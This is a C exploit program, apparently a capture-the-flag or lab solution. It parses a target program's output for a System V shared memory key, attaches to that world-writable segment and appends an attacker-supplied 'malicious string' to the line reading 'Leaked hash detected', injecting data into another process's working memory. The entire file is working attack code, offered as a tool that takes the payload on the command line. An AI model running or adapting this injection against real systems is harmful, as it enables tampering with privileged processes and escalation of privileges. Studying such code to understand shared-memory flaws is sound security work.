#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <sys/types.h>

#define SHM_MODE 0666 // Permissions for shared memory

// Appends the malicious string to the line containing "Leaked hash detected"
void append_to_leaked_hash(char *shm_ptr, const char *malicious_string) {
    char *line = strtok(shm_ptr, "\n"); // Split the memory data into lines
    while (line != NULL) {
        if (strstr(line, "Leaked hash detected") != NULL) {
            strcat(line, malicious_string);
            break; // Exit after modifying the first matched line
        }
        line = strtok(NULL, "\n");
    }
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <malicious_string>\n", argv[0]);
        return 1;
    }

    char shm_key_str[2048] = "";
    char line[512]; // Temporary buffer to hold individual lines from stdin

    // Read stdin until "Using the shared memory" is found
    while (fgets(line, sizeof(line), stdin)) {
        strncat(shm_key_str, line, sizeof(shm_key_str) - strlen(shm_key_str) - 1);
        if (strstr(line, "Using the shared memory") != NULL) {
            break;
        }
    }

    // Extract the shared memory key
    char *start = strstr(shm_key_str, "Using the shared memory ");
    if (start) {
        start += strlen("Using the shared memory ");
        char *end = strstr(start, " as temp location");
        if (end) {
            *end = '\0'; // Null terminate to isolate key string
        }

        printf("Extracted Hex Key: %s\n", start);
        key_t shm_key = (key_t)strtol(start, NULL, 16);

        int shmid = shmget(shm_key, 0, SHM_MODE);
        if (shmid == -1) {
            perror("shmget");
            printf("No shared memory segment found for the given address: 0x%X\n", shm_key);
            return 1;
        }

        // Attach to shared memory
        char *shmaddr = shmat(shmid, NULL, 0);
        if (shmaddr == (char *)-1) {
            perror("shmat");
            exit(1);
        }

        // Inject malicious string
        const char *malicious_string = argv[1];
        append_to_leaked_hash(shmaddr, malicious_string);

        printf("Updated Shared Memory Data:\n%s\n", shmaddr);

        // Detach from shared memory
        if (shmdt(shmaddr) == -1) {
            perror("shmdt");
            exit(1);
        }
    }

    return 0;
}
